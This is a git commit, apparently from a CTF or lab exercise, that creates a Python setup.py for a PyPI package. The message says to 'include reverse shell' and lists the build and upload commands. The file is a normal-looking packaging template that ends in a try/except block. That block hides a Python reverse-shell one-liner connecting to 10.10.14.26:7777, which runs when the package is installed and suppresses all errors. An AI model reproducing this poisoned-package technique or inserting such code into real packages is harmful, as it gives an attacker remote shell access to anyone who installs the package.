ab7748b9ad613d52a3128f9767c3ca115d086ac9
Mohin Paramasivam <mohin2099@gmail.com>
2020-07-14 15:11:48 +0800

    Create setup.py
    Include reverse shell under try or any commands.
    
    Compile Create Package Command: python3 setup.py sdist bdist_wheel
    
    Upload to PypiServer Command : 
    
    python3 -m pip install --user --upgrade twine
    python3 -m twine upload --repository <repository_name from .pypirc> dist/*
    
    Guide : https://packaging.python.org/tutorials/packaging-projects/

---
+++ setup.py
@@ -0,0 +1,30 @@
+import setuptools
+
+with open("README.md", "r") as fh:
+    long_description = fh.read()
+
+setuptools.setup(
+    name="example-pkg-Shad0wQu35t", # Replace with your own username
+    version="0.0.1",
+    author="Example Author",
+    author_email="author@example.com",
+    description="A small example package",
+    long_description=long_description,
+    long_description_content_type="text/markdown",
+    url="https://github.com/pypa/sampleproject",
+    packages=setuptools.find_packages(),
+    classifiers=[
+        "Programming Language :: Python :: 3",
+        "License :: OSI Approved :: MIT License",
+        "Operating System :: OS Independent",
+    ],
+    python_requires='>=3.6',
+)
+
+
+try:
+
+        import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.26",7777));os.dup2(s.fileno(),0>
+
+except Exception as e:
+        pass
